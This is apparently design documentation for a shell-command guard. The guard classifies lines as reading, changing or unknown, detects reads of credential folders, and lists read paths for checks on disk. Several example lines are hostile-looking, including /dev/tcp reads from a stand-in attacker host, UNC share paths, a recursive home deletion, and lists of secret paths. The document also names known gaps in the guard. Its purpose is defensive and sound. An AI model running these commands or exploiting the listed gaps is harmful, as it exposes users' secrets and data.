- **`Workspace`**: every read lands inside a workspace folder (the
  repository's history, a startup file and a path the caller protects are
  inside it too), in a temporary file, or on the null device, and none is a
  secret.
- **`Beyond`**: at least one read lands anywhere else: the home folder, a
  system folder, a folder that holds the workspace (`..`), a temporary folder
  itself (`ls /tmp`; a file inside it is `Workspace`), a disk, the registry,
  anywhere outside the workspace; or it is a **secret**, core's
  `Sensitivity::Secret` (a key or a credential: `~/.ssh`, `~/.aws`, `~/.netrc`
  and the rest of core's list), even inside the workspace. That is the case of
  a workspace that is the home folder, or one that holds a folder of logins.
- A line that is `Changes` or `Unknown` has no `Reach`. A path known only when
  it runs is already `Unknown`, so it never gets one.

**What a line reads** is the places the answer already judges, each placed by
core the way a path is for `classify` (so `..`, `.`, doubled separators, `~`,
`$HOME`, case, 8.3 names and UNC paths come out as they do there):

- every file operand of a reader and the source of every `<` redirect;
- the folder of every lister (`ls ~`, `find /`, `Get-ChildItem C:\`);
- the value of an option that names a file, such as `grep -f ~/words`;
- the folder a `cd`, `pushd` or `Set-Location` goes into: going in is a read, so
  `cd ~` is `Beyond` even as a line of its own, for a caller that keeps the
  shell between lines;
- **the working directory, when a reader with no file operand reads it
  without being told.** `ls`, `du`, `fd`, `find` with no start, `rg PATTERN`,
  `grep -r PATTERN`, `Get-ChildItem` and `dir` with no path read the folder the
  line runs in: the caller's `cwd`, moved by every `cd` the guard follows, the
  way `classify` follows it. `git` reads the repository at the working
  directory, or at the folder `-C` names (chained: `-C a -C b` is `a/b`, and an
  absolute one starts over). A line run from outside the workspace, or after
  `cd ~` or a `cd ..` past the workspace's root, is `Beyond`;
- the shell's own expansion of a wildcard in an operand of a program that
  opens nothing (`echo ~/.ssh/*` lists a folder);
- for `find`, the file `-newer`, `-anewer`, `-cnewer` and `-samefile` name;
- for `git`, the revisions and pathspecs after the subcommand, read as paths.
  Some are relative to the repository's root, not to the working directory:
  `:/x`, `:(top)x` and every magic pathspec, `:x` and `:0:x` (the index), and
  `REV:x` unless `x` starts `./` or `../`. The guard does not know where the
  root is, so such a path is judged from the working directory and from each
  workspace folder, and a `Beyond` reading wins.

Lines that read nothing (`echo hi`, `pwd`, `true`, `which cargo`, `basename x`,
`printf`) are `Workspace` from anywhere. So are readers of their input (`cat`,
`head`, `tail`, `wc`, `sort`, `grep PATTERN` with no file) given no operand.

**Deep reads.** A reader that goes below the folders it names reaches what is
below them, so a deep read of a folder that holds a secret is `Beyond`: `rg
PATTERN`, `grep -r`, `diff -r`, `ls -R`, `du`, `find`, `fd`, `git`, PowerShell
`Get-ChildItem -Recurse` (and `-Depth`), cmd `dir /s` and `findstr /s`. It is a
whitelist: a reader is shallow only when its table entry says so for the flags
it is given (`cat`, `head`, `tail`, `wc`, `stat`, `realpath`, `sort`, `file`,
`less`, `df`; `ls`, `diff` and `grep` without a recursive flag; in PowerShell
`Get-Content`, `Select-String`, `Get-Item`, `Test-Path`, `Resolve-Path` and
`Get-ChildItem` without `-Recurse`; in cmd `type`, and `dir` and `findstr`
without `/s`). Anything recursive or unknown is deep, a reader added later
included. A flag counts by any prefix of its long name, as GNU programs and
PowerShell read it (`diff --rec`, `ls --recurs`, `gci -Rec`), and an argument
known only when it runs could be one. A deep read of a folder that holds no
secret, which is nearly every project folder, stays `Workspace`.

A *listing of names* (`ls -R`, `find .`, `git ls-files`, `fd`, `du -a`) is
deep too: it shows where a secret is, so a listing that reaches one is
`Beyond`, and one that only reaches protected paths, `.git` or a startup file
is `Workspace`.

**Wildcards.** A wildcard is judged by what it can pick, with the shell's own
rules for hidden names: a POSIX `*` does not match a leading dot (unless
`dotglob`, `globdots` or `GLOBIGNORE` is on) and `.*` does; PowerShell and cmd
wildcards always do, so `Get-Content *\*` and `Select-String -Path *\*` reach a
hidden folder. A pattern that picks a secret, or goes below one, is `Beyond`; a
deep read of a pattern that picks a folder holding one is too. In PowerShell
and cmd a wildcard with a recursion is a filter on every folder below the one
it starts in. A part that starts with a dot and matches `..` (`.*`, `.?`)
reads the folder above as well, in the shells whose patterns match it.

What a line reads is also judged by what a place is *to the workspace*, which
core's place does not say: a protected path or a startup file is the
workspace's own only when it is inside a workspace folder (`~/.bashrc` is
`Beyond` from a workspace elsewhere, and `Workspace` when the home folder is
the workspace; `~/.agent/x` is `Beyond` when the protected folder is in the
home), judged by the spelling alone, as the paths are.

Whitelist, not blacklist: only the readers known to read just their operands or
their input are left out of the working-directory rule (`cat`, `head`, `tail`,
`wc`, `stat`, `realpath`, `diff`, `sort`, `file`, `less`, `df`; in PowerShell
`Get-Content`, `Select-String`, `Get-Item`, `Test-Path`, `Resolve-Path`; in cmd
`type`, `findstr`). Any other reader, and any reader added to the table later,
is taken to read the working directory when it has no operand, and a reader
whose implicit input cannot be placed is `Beyond`: `df` with no operand reports
every mounted disk.

What stays open, and a caller should know:

- `grep -R`, `rg -L` and `--follow`, and `find -L` and `-follow` follow
  symbolic links by design, so a link in the workspace to a folder of keys is
  read through. Links are placed by their spelling, as everywhere in the guard.
- `git diff`, `git log -p` and `git blame` read the content of every tracked
  file, and a secret that is committed is among them (`git show HEAD:.ssh/x` and
  a pathspec that names it are read as paths and are `Beyond`; the bare `git
  diff` is not). The repository git finds above the working directory is read
  too, and the guard cannot see where it is: a workspace that is not itself a
  repository, inside one that is, reads beyond it.
- `test`, `[` and `[[ ... ]]` check that a file exists and read nothing.
- A POSIX `*` over the home folder (`cat */x` run in it) is `Beyond` because the
  folder is the home folder, whatever the pattern picks; a pattern that picks
  the folder of a login (`cat *` in a folder holding `gh`) is `Beyond` too, as
  `cat` would open it.

### The paths a line reads

`Reach` is judged by spelling, because the guard never touches the disk. So a
link inside the workspace that points out of it reads as `Workspace`: with
`link -> ~/.ssh`, the line `cat link/id_rsa` is `ReadsOnly(Reach::Workspace)`.
A caller that can look at the disk, and runs `Workspace` reads without asking,
needs the places the line reads to check them itself, and how the program
reaches from each: `cat *.rs` opens whatever the shell expands the pattern to
(`a.rs -> ~/.ssh/id_rsa`), `cat src/*/x.rs` is expanded across `src/a -> ~`,
and `grep -R x src` or `ls src | xargs cat` opens what it finds through links.
The guard has already placed each read, so `effect_paths` returns them, from
the same reading as `effect` (one pass, not a second walk):

```rust
effect_paths(line, shell, &paths) -> Option<Vec<ReadPath>>   // Some only for ReadsOnly(_)

pub struct ReadPath { pub path: PathBuf, pub how: How }
pub enum How {
    Exact,                              // one path
    Glob(String),                       // a pattern: `path` is its folder, this the rest
    Tree { follows_links: bool },       // a folder the program walks, or lists for another
}
```

Both enums are exhaustive, like `Effect`: a way of reading the caller does not
handle would be a way past its check.

It is `Some` exactly when `effect` is `ReadsOnly(_)`, the reach either way, and
`None` for `Changes` and `Unknown`. A test holds every row of every table to
that, and holds the paths of every `ReadsOnly(Workspace)` row to be inside a
workspace folder or a temporary folder by spelling.

**How each is read, and what a caller does with it:**

| `how` | Which reads | What the caller checks on disk |
| --- | --- | --- |
| `Exact` | A file operand, a `<` source, a folder a lister lists, a `cd` target, a path `git` takes. | Canonicalize the path: when it does not exist, canonicalize its nearest existing ancestor and put the rest of the names back. |
| `Glob(rest)` | A pattern the shell expands: `path` is the fixed folder it expands in and `rest` what follows it, as written (`src/*/x.rs` is `src` and `*/x.rs`; `*.rs` is the working directory and `*.rs`; `.a*/x` is the working directory and `.a*/x`, the leading dot kept; `C:\*` is `C:\` and `*`). A `for` over a pattern is the same, and so is a pathspec `git` expands. | Expand `path` + separator + `rest` on disk the way the shell does (a wildcard may match a leading dot: match it, to be safe), and canonicalize the folder and every match. The expansion crosses links, so a link shows in a match. |
| `Tree { follows_links: false }` | A folder walked by one of the readers known to stay out of links, given only flags its own list says do not change that: `grep -r` (not `-R`, `-S`), `rg` and `fd` (not `-L`, `--follow`), `find` (not `-L`, `-follow`, `-xtype`, `-exec`, `-ok`), `ls -R` and `du` (not `-L`, `-H`, `--dereference`), and the repository `git` reads (not `--no-index`). `find -H` and `grep -O` follow only the folder named on the command line, which is the root: they stay here. | Canonicalize the root. That is the whole check: such a reader does not cross a link it meets below it. |
| `Tree { follows_links: true }` | A folder walked by a reader that opens what it finds through links: `grep -R` and `grep -rS`, `rg -L` and `--follow`, `fd -L`, `find -L`, `-follow` and `-exec`, `ls -RL`, `du -L`, `diff -r`, and any reader the guard does not know to stay out of links (every PowerShell and cmd walk included). It fails closed: a walker on the list that is given any flag its list does not name, an abbreviation of a flag included (`ls -R --recurs`), follows. Also the folder of a lister whose names a later stage opens: `ls src \| xargs cat`, `git ls-files \| xargs cat`, `find src -print0 \| xargs -0 grep x`, `Get-ChildItem \| Get-Content`. | A link anywhere below the root can lead out, which only walking the folder shows. A caller may simply treat the line as reading beyond the workspace, or walk the folder and canonicalize every entry. |

Where the same place is read in more than one way, the entry that asks the
most is kept: a walk that follows links over a walk that does not, either over
an exact path. A pattern whose matches are walked through links, or whose
listing is handed on, is the walk from its folder.

A caller treats the line as reading beyond the workspace when anything these
checks find leaves it. It compares with the workspace folders after
canonicalizing them too, and with the temporary folders the guard allows,
canonicalized the same way: `/tmp`, `/var/tmp` and `/var/folders`, and on a
Mac `/private/tmp`, `/private/var/tmp` and `/private/var/folders` (`/tmp`
canonicalizes to `/private/tmp`, and `/var/folders` to `/private/var/folders`);
on Windows `%USERPROFILE%\AppData\Local\Temp` and `C:\Windows\Temp`. A temporary
path is `Workspace` by the rule for temporary files, not because it is inside
the workspace, and `effect_paths` lists it like any other.

- **What it holds** is what [What a line reads](#reach) lists: every operand
  and `<` source, a lister's folder, a `cd` target, the working directory
  when a reader reads it without being told, the root of a deep read (`rg TODO
  src` is `src`), the repository at the working directory or the folder `-C`
  chains, and a `git` revision or pathspec as `effect` places it (`git show
  HEAD:a.rs` also lists `a.rs`, from the working directory and from every
  workspace folder).
- **Absolute, by spelling.** Each path is resolved as the guard resolves it:
  the working directory after the `cd`s it follows, `~`, `.` and `..`, a Windows
  long path as the plain path it names. The case, the macOS names of the root
  volume (`/System/Volumes/Data`) and the links are left alone: the path is as
  written, made absolute. It comes from core's `Resolver::absolute`. A `\\?\`
  and a `FileSystem::` in front of a path are not part of a pattern.
- **Sorted, each entry once**, so the answer is the same every time.
- **No path, not listed.** A read that is not a place on a disk has no path:
  the null device and other devices, a registry hive or another PowerShell
  drive, and a path on another drive's own working directory (`D:x` from `C:`).
  Each is judged by its place already (the null device is `Workspace`, the rest
  `Beyond`). `cat /dev/null` is `Some([])`, as `echo hi` is.
- **`Beyond` lines are listed too**, with every read, not only the one that
  made it `Beyond`.
- **Over-listing** is on the safe side: `cat '~/x'` lists the home folder's `x`
  (the guard reads the quoted `~` as home), `cat 0< x` lists a path `0`, and a
  git revision is listed as a path (`HEAD~1`).

`effect` costs what it did: the paths are collected only when `effect_paths`
asks, and `classify` is untouched.

### The readers

The table is short on purpose. A program not in it is `Unknown`. A reader that
takes a flag which writes is `Changes` when the flag is given; one that takes a
flag which runs another program, or can be handed one by an argument known only
when it runs, is `Unknown`.

| Shell | Reads only |
| --- | --- |
| POSIX | `ls`, `cat`, `head`, `tail`, `wc`, `stat`, `pwd`, `echo`, `printf`, `grep`, `egrep`, `fgrep`, `diff`, `du`, `df`, `which`, `realpath`, `basename`, `dirname`, `true`, `false`, `test`, `[`; `less`, `sort`, `file`, `rg`, `fd`, `find` and `git` with the care below; `cd`, `pushd` and `popd` when the guard follows them. |
| PowerShell | `Get-ChildItem`, `Get-Content`, `Select-String`, `Get-Item`, `Get-Location`, `Test-Path`, `Resolve-Path`, `Write-Output`, `Write-Host`, `Where-Object`, `Select-Object`, `Sort-Object`, `Measure-Object` and the aliases `cat`, `gc`, `type`, `sls`, `echo`, `pwd` (and `ls`, `dir`, `gci`, which `classify` already reads as `Get-ChildItem`); `git`; `Set-Location` when followed. |
| cmd | `dir`, `type`, `findstr`, `echo`; `git`; `cd` when followed. |

- GNU `sort`, `file` and `less` take any unambiguous prefix of a long option
  (`sort --outp=x` is `--output=x`, `file --comp` is `--compile`, `less
  --log=x` is `--log-file=x`). So a long option of theirs reads only when it
  is exactly one the guard names (`sort --reverse`, `file --brief`, `less
  --quit-if-one-screen`); a prefix of the option that writes is `Changes`
  (names compare without case, as `less` does), and any other is `Unknown`.
  The other readers have no long option that writes or runs a program, and `git`
  and `rg` refuse abbreviations.
- `sort -o` and `sort --output` write (`Changes`); `--compress-program` runs a
  program. `file -C` writes. `less -o`, `less -O` and `--log-file` write, `less -k`
  reads a lesskey file (whose `#env` section can set `LESSOPEN`), and an
  argument that starts with `+` is a `less` command. `rg --pre`, `rg
  --hostname-bin` and `rg -z` run a program; `fd -x` and `fd -X` run one.
  `printf -v NAME` sets a variable. All the others in the first group have no
  flag that writes or runs anything.
- `find` is `Changes` with `-delete`, `-fprint`, `-fprint0`, `-fprintf` or
  `-fls`. `-exec`, `-execdir`, `-ok` and `-okdir` are not a reason of their own:
  the program they run is a unit, as for `classify`, and is judged as one
  (`find . -exec cat {} +` reads only, `find . -exec rm {} +` changes).
- `git` is read for the subcommands `status`, `log`, `diff`, `show`, `blame`,
  `rev-parse` and `ls-files`, `remote` alone and `remote -v`, and `branch` and
  `tag` when they only list: every flag a listing one, and no operand that
  would create (`git branch topic` makes a branch; `git branch --list 'x*'`
  lists). `--output=FILE` writes. Each of the other reading subcommands has a
  list of the options it knows as reading ones, in `effect/git.rs`, and any
  other option is `Unknown` (`--ext-diff`, `--textconv`, `--help`, and any option
  added later); git refuses abbreviated long options, so a name matches
  exactly. `log`, `show` and `diff` share what they print about a change
  (`--stat`, `--name-only`, `-p`, `-w`, `-M`, `--color`, ...) and `log` and
  `show` what they walk (`--oneline`, `--graph`, `--decorate`, `--all`,
  `--author`, `--since`, `-n`, `-L`, ...); `status` has `-s`, `-b`,
  `--porcelain`, `-u`, `--ignored`; `blame` `-L`, `-w`, `-M`, `-C`, `-e`,
  `--porcelain`; `rev-parse` `--show-toplevel`, `--abbrev-ref`, `--git-dir`,
  `--verify`, `--short`; `ls-files` `-c`, `-d`, `-m`, `-o`, `-s`,
  `--exclude-standard`. Of these, the options that take a file are places: `blame
  --contents`, `--ignore-revs-file` and `-S`, `-O` and `--orderfile` on `diff`,
  `log` and `show`, and `ls-files -X` and `--exclude-from`; a value known only
  when it runs there is `Unknown`. An option that git takes with an optional
  value takes it only after `=` (`--pretty`, `--format`, `--date`, `--color`,
  `--stat`, `-U3`, `-M90%`, `-uno`): alone it takes nothing, so the next word is
  not swallowed. `log --show-signature` is not in the list, since it runs the
  `gpg.program` the repository's config names. `shortlog`, `describe`, `reflog`,
  `cat-file`, `ls-tree`, `grep`, `merge-base` and `rev-list` are not yet read, and
  are `Unknown`. The writing subcommands (`add`, `commit`, `push`, `checkout`, ...) are
  `Changes`, the rest `Unknown`. Only `-C`, `--no-pager`, `-P` and
  `--no-optional-locks` may come before the subcommand: `-c` and the others
  can make git run a command. What the repository's own config makes git run
  is not read, and a caller should know it: `diff.external` and textconv
  drivers (which `diff`, `show`, `log -p` and `blame` run on the files they
  show), `core.fsmonitor` (which `status` runs), and the lazy fetches of a
  partial clone (which any of them may make over the network). Each runs a
  program or touches the network from configuration the guard cannot see.
- Package managers and build tools (`cargo`, `npm`, `pip`, `make`, `brew`,
  `dotnet`, ...) are `Changes` whatever their subcommand.
- A program named with a folder is the program the shell finds by that name
  only in a system folder (`/bin`, `/usr/bin`, `/usr/local/bin`,
  `/opt/homebrew/bin`): `./cat`, `bin/ls` and `/tmp/x/ls` are `Unknown`, as are
  `cat.bat` and, in a POSIX shell, `ls.exe`.
- A variable the line sets or unsets makes it `Unknown`: `PATH=. ls`, `env
  PATH=. ls`, `env -u PATH ls`, `export PATH=...`, `GIT_PAGER=x git log`, and
  in PowerShell and cmd any assignment (`$env:PATH = ...`, `set X=1`). A
  language or a display setting is let through (`LC_ALL=C sort`, `LANG`, `TZ`,
  `TERM`, `COLUMNS`, `LINES`, `NO_COLOR`). A `for` loop's own variable is not a
  setting, unless its name could be one that changes what runs (`PATH`, or in
  zsh `path`).
- A PowerShell method call (`[IO.File]::ReadAllText(...)`, `$x.Delete()`) is
  no unit, and the rules know only some of them: it is `Unknown`. So is a
  backtick substitution in an unquoted here-document, which the grammar does
  not read and the shell runs.
- **A path known only when it runs makes the line `Unknown`.** A reader's file
  operand or the source of a `<` redirect (`cat $f`, `cat < "$F"`, `cat
  "$(pwd)/x"`, `grep x "$f"`, `type %X%`, `Get-Content $x`, `cat ~root/x`) may
  name anything, a network device or a share included, and what cannot be read
  is not reads-only. The paths the guard names stay known: `~`, `$HOME`,
  `$TMPDIR`, `$env:TEMP` and the other forms [Core](core.md) resolves, and a
  glob, which is a pattern over known folders (`cat *.rs` reads only).
- **Only a path is judged as a path.** Each reader's table entry says which
  arguments the program opens as files. A pattern, a count or an author is
  data: `grep -rn "$PATTERN" .`, `rg "$x" src`, `head -n "$N" x`, `sort -k
  "$K" x` and `git log --author="$NAME"` read only. For `grep` and `rg` the
  first operand is the pattern, unless `-e` or `-f` gives it (`-f FILE` and
  `rg --ignore-file FILE` are paths, and so is every operand of `rg --files`);
  a value of an option that takes one is data, unless the option takes a file;
  for `find`, the places are the arguments before the first test, and the
  value of `-name` and the like is data. For `git`, the places are the value
  of `-C`, what comes after `--`, and every operand of `--no-index`; the other
  operands are revisions and pathspecs inside the work tree, which git does
  not take outside it. A value counts as data only when it is known or every
  expansion in it is in double quotes: unquoted, `$x` splits into more
  arguments, options among them, and is an operand. An operand known only when
  it runs is `Unknown` for `git`, since it could be an option. What stays
  open: a quoted pattern or value could itself start with `-` and be read as an
  option.
- **Switches and options that name a file or folder are places too.** In cmd,
  `findstr` takes its switches with `/` or `-` (`/f:file`, `-f:file`) and runs
  letters together after one prefix, the one that takes a value last (`/smf:file`,
  `-if:file`); `/s/b` is two runs. A switch is never an operand. A run with a
  letter `findstr` does not know, or a value switch that is not last, makes the
  line `Unknown`. Three switches name files: `/G:file` holds the search
  strings and `/D:dir;dir` the folders to search (a list split at `;`), and
  their values are places; `/F:file` is a list of files to open, which the
  guard never sees, so it is `Unknown` whatever it names. `/C:string` and
  `/A:attr` are data. With `/G:` or `/C:` every operand is a file, where
  otherwise the first operand is what to search for (one known only when it
  runs could be a switch, so it is a place). `dir`'s `/A:`, `/O:` and `/T:` are
  data, and `type` has no switch. `//server/share` is no switch.
- **An option that reads its list of files to open from another file is
  `Unknown`, whatever its value**, since the list could name a share:
  `findstr /F:`, `wc` and `du` and `sort` `--files0-from`, `file -f` and
  `--files-from`, `find -files0-from`, and `xargs -a` and `--arg-file`. An
  option whose file holds patterns, not paths, is read as a place only:
  `grep -f`, `rg -f`, `findstr /G:`. Of GNU's other long options, `diff
  --from-file` and `--to-file`, `grep` and `rg` `--file`, `du` and `diff`
  `--exclude-from`, `sort --random-source` and `realpath --relative-to` name a
  file, and the file is a place.
- In PowerShell, `-Path` and `-LiteralPath` (`Get-ChildItem`, `Get-Item`,
  `Get-Content`, `Select-String`, `Test-Path`, `Resolve-Path`) and
  `Resolve-Path -RelativeBasePath` are places; `-Filter`, `-Include`,
  `-Exclude`, `-Stream`, `-Encoding`, `-Delimiter`, `-Tail`, `-TotalCount`,
  `-Pattern`, `-PathType` and `-OlderThan` are not. None of the readers in the
  cmd and PowerShell tables has a switch that writes; `sort /O`, `more`,
  `where` and `find` of cmd are not in them and are `Unknown`.
- **An option never swallows an option.** Whenever a reader's option takes
  its value from the next word and that word starts with `-` (a number such as
  `head -n -5` is a value), the line is `Unknown`, in every reader's option
  parser, so an option listed as taking a value that git or another program
  also takes bare can never hide a real option behind it.
- **PowerShell quotes inside a word are taken off as PowerShell takes them**
  before the word is judged: `--contents="\\evil\s"` reaches the program as
  `--contents=\\evil\s`, and a doubled quote inside quotes of its kind is one.
- **A pipeline into a reader** (`xargs cat`, and in PowerShell `Get-Item`,
  `Get-ChildItem`, `Test-Path`, `Resolve-Path`, `Get-Content` and `Select-String`
  with no path of their own) hands it paths, so the stage before it must list
  known places: `ls`, `fd`, `dir`, `Get-ChildItem`, `git ls-files`, or a `find`
  that prints only what it finds (`-printf` and `-exec` print any text), through
  stages that only select or order (`head`, `tail`, `sort`, `grep` with no file
  of its own; `Where-Object`, `Sort-Object` and `Select-Object -First`, with no
  `-Property`). `ls | xargs cat` and `Get-ChildItem | Get-Content` read only;
  `echo a | xargs cat` and `'\\evil\share' | Test-Path` do not. A
  `Select-String` also takes the text of `Get-Content` or another search.
  Programs that only print their operands (`echo`, `printf`, `basename`, `test`,
  `Write-Output`) are not readers of them.
- **A `for` over words written out** (no expansion in the list) is read with
  each word in place of the variable, as if the body were written out, the
  network check included: `for f in *.txt; do wc -l "$f"; done` reads only,
  `for f in /dev/tcp/h/80; do cat $f; done` does not. A glob stands for itself.
  Not read this way, so `Unknown`: a list with an expansion (`for f in $(ls)`),
  no list (`for f; do`), a body that sets the variable (assignment, `unset`,
  `read`, `((`, `${f:=}`, a loop of the same name) or defines a function, a
  variable in the program's own name, and a `<` redirect in the body. More than
  64 combinations of words are not read either.
- A read that contacts the network is `Unknown`, judged on the path's known
  value after quotes are resolved, never on its spelling. Every reader's
  arguments get that check, and so does every value inside one: after the
  `=` of a long option or the `:` of a switch, and attached to a short option
  (`-O//evil/s/x`, `--exclude-from=\\evil\s\x`, `/a:\\evil\s`), so the option
  nobody listed is caught too. Only the spelling of a share or a device is
  checked in a value, not whether it is known: `--author="$NAME"` still reads
  only. In PowerShell a variable inside a bare token (`--contents=$p`) is
  expanded, so such a value is a path known only when it runs. The names are: a path naming bash's
  `/dev/tcp/HOST/PORT` or `/dev/udp/HOST/PORT`, as an operand or as the source
  of a `<` redirect (`cat < /dev/tcp/evil.example/80`; a spelling that hides
  it, such as `/dev/$'\x74'cp/...` or `/dev/${X}tcp/...`, is a path known only
  when it runs); and in PowerShell and cmd a UNC path (`\\server\share`,
  `//server/share`, `\\?\UNC\server\share`, `\\.\UNC\server\share`,
  and `GLOBALROOT` after `\\?\` or `\\.\`, which reaches the share through
  the device namespace), which offers the user's credentials to the server. A
  long path or device that is a disk (`\\?\C:\x`, `\\.\PhysicalDrive0`) is
  not a share. Repeated separators and `.` parts are folded as Windows folds
  them (`\\.\\UNC\host\share`), and a path with `..` in its root counts. Core
  reads that spelling (`spelling::network`), the file guard's `network_share`
  too. A `<` redirect is read in cmd too, with a handle in front (`0<`).
- Not read, so the caller has to account for them: an alias or function
  defined outside the line, the `PATH` the shell runs with, and an option set
  by a start-up file. A name in the table is taken to be the program that
  name means.
- `echo` and `printf` count as reading: with no redirect they change nothing.
  `echo hi > out.txt` is `Changes` through its redirect.

`effect` is an enum of its own and not a field of an explanation of the line.
It is exhaustive, as `Rule` is and for the same reason: the three answers are
the whole question, and a fourth would change what a caller's gate means by
"reads only", so it must break every caller's `match` at compile time. (A
caller that only asks whether `effect(..)` is `ReadsOnly(_)` is unaffected by one.)

## Explaining a line

```rust
explain(line, shell, &paths) -> Explanation
```

When a line comes out wrong, the reason is in the split, which is private.
`explain` returns it: every unit as the rules saw it (the program as written, the
arguments (a known one with its quotes taken off, an unknown or template one as
written), where each argument would land if read as a path, the
folder it runs from after a `cd`, the wrappers taken off, the shell and the
nesting depth it came from, its stage in a pipeline; a part of the line the
grammar reads again, like what follows the `&&` in cmd's `set X=1 && del y`,
counts one level, as the depth limit does) with the findings that
unit produced, each redirect's write the same way, and the findings of the line
itself (a part that cannot be read, a program known only when it runs, a limit
hit). Every known argument that is not an option gets a place, whether or not
the program takes it as a path (`reset` in `git reset` lands inside the
workspace); which arguments are paths is the rules' business, not the tree's.

`classify` is `explain` without the tree: both take their answer from one
reading of the line (`effect` too, from the same split), so `Explanation::findings`
is what `classify` reports, and a test holds them equal for every row of the
tables. `Explanation` implements `Display` as a short indented tree. It builds
the string and prints nothing, so the contract test over `src/` still passes.

The example in the shell crate prints that tree. It is the one place that reads
arguments and prints, and it lives outside `src/`:

```text
cargo run -p milo-guards-shell --example explain -- \
    --shell posix --cwd /work/app --home /home/me --workspace /work/app \
    'sudo rm -rf ~ && bash -c "git reset --hard"'
```

`--shell` is `posix` (the default), `powershell` or `cmd`; `--workspace` can be
repeated. A caller gets `explain` as `milo_local_guards::shell::explain`
through the front door, which has no logic and no example of its own.

## Tests

The tests are tables: `tests/posix.rs` for POSIX lines, `tests/windows.rs` for
PowerShell and cmd, built on core's test kit. Each table has a list of safe
lines and a list of risky lines with the rule each must break. A new rule
comes with rows of both kinds.

`tests/effect.rs` is the same for `effect`: a table of lines for each answer. Every
line of `posix.rs` and `windows.rs` also goes through `effect`: the shared
`check` does it for each row of a table, and the tests that name a finding's
reason judge their lines with the shared `classify` of `tests/common`, which
does it too. A line `classify` finds risky for anything but an elevation or a
read of a key must not be `ReadsOnly`. The same check runs `explain` over each
row: its findings and assessment must be `classify`'s, and its tree must show
every finding. `tests/issue_15.rs` holds what `explain` shows.

`tests/secrets.rs` holds the rows of `read_secret`: the everyday lines that
stay safe, a line for every program the rule knows, a redirect, a listing
piped into a reader, every spelling of a key in a POSIX shell, on a Mac, in
PowerShell and in cmd, and what the kernel serves; its rows go through the same
`effect` check. The front door's
`crates/guards/tests/agree.rs` holds the shell and the file guard to one
answer (see [Reading a key](#reading-a-key)).

`tests/reach.rs` keeps every probe the review of `Reach` ran, read in a workspace
with nothing protected, one with a protected `.agent`, one that is the home
folder and one that holds a folder of logins, in POSIX, PowerShell and cmd; the
rest of `Reach`'s rows are in `tests/effect.rs`, and core's `reaches_secret`
has its own in `crates/core/tests/reaches_secret.rs`.
`tests/paths.rs` has the rows of `effect_paths`, in POSIX, PowerShell and cmd, and
one that checks every way of reading against a table of links playing the disk,
the way the docs tell a caller to; and
every row of every table is also held to agree with `effect` on whether it has
a list (`common::path_disagreement`). Core's `absolute` has its own in
`crates/core/tests/absolute.rs`.
`tests/names.rs` walks `Rule::ALL` and checks the wire names, that each rule is
listed once, and that the trait gives the same name as the method. Its list of
expected names is a `match` with no fallback arm, so a new rule does not compile
until it is named there. Three files feed the guard random and extreme lines and
check what no line may do to it, for each of the three shells. `tests/robust.rs`
holds six tests (seeded noise that never panics, a line too long or too nested
being unreadable, a line whose nested scripts are read too often being
unreadable, and three that time a nasty line against a 200 ms bound);
`tests/timing.rs` and `tests/limits.rs` hold the rest, as each bullet says:

- **Never panics, and `classify`, `effect` and `explain` agree.** (The wide run
  is `wide_random_lines_never_panic_and_stay_quick` in `tests/timing.rs`;
  `tests/robust.rs` keeps the narrower `random_lines_never_panic`.) Thousands of
  seeded random lines (a small linear congruential generator, so a failure
  names its seed) joined from a wide set of pieces: quotes, substitutions and
  brackets left open, here-documents with no end, here-strings, NUL, a line cut
  through a character or with bytes no text holds read back lossily, and
  PowerShell and cmd metacharacters. The same noise goes through `effect` and
  `explain`, which must agree with `classify`.
- **A line left open is risky, and a delete is never safe.** (In `tests/limits.rs`.) Safe is a verdict
  the guard has to earn, so the tests say what a safe line may be, apart from
  the guard. A line of plain words, separators and one delete (written for the
  shell) is never safe: nothing in it can make the delete inert. A line of
  plain words that ends in a quote, substitution, bracket or here-document left
  open, or an operator with nothing after it, is never safe either, unless its
  shell reads that ending as a plain word: the test keeps a list of those per
  shell (cmd has no single quotes or backticks; PowerShell's grammar reads `<<`
  as a word, though PowerShell itself refuses the line, so nothing runs), and
  a table pins both sides. That a line is read at all is not the
  claim: a program the guard does not know is safe.
- **A line too long or too nested comes back unreadable** (and `Unknown` for
  `effect`). (In `tests/robust.rs`; `tests/limits.rs` measures where the edges
  are.)
- **The time.** (In `tests/timing.rs`, which runs its tests one at a time, and
  in a binary of its own: cargo runs test binaries one after another, so no
  heavy test shares the machine with a clock. The three bounded at 200 ms in
  `tests/robust.rs` stay there.) The worst of the random lines, and a line at the length limit
  in each of fourteen shapes in each shell (a chain, a pipeline and a
  conjunction with each shell's own separator: `;` is no separator in cmd, `&`
  is), classify and give `effect` within a bound that holds in the debug build
  `just verify` runs (500 ms and 2 s). In a release build the longest takes
  under 100 ms, and most are far quicker. Lines that made `find -exec` build
  gigabytes (a place of 25,000 bytes and an argument of 17,000 `{}`), and
  ones of several levels, are timed the same.
- **The limits.** (In `tests/limits.rs`, another binary of its own, for the
  same reason: each search reads many long lines.) The table above, found by measuring and held on both sides:
  the longest line, the deepest bracket nesting for each opener in each shell,
  the most shells in shells, wrappers in front of a program, finds in finds,
  here-documents started on a line, the `find -exec` work (in places, at a
  fixed weight), brackets still open and cmd's `&` and `|` that still read:
  the last two inside a string, where the grammar sees no nesting, so the count
  alone is measured. One past each is unreadable, so a later
  change to a limit, or to how deep a grammar nests, fails loudly. `find`s
  eight places wide and sixteen deep, and five thousand deep, are unreadable
  and return at once.
